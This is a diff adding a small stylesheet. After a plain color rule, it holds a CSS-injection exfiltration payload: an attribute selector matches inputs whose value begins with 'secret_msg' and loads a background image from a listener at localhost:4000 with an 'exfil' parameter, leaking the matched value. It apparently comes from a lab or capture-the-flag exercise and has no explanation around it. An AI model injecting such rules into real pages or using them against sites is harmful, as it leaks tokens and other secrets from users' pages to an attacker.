@@ -1,0 +1,9 @@
+body {
+    background-color: black;
+    color: white;
+  }
+  
+  input[value^="secret_msg"] {
+    background-image: url("http://localhost:4000/?exfil=secret_msg");
+  }
+  
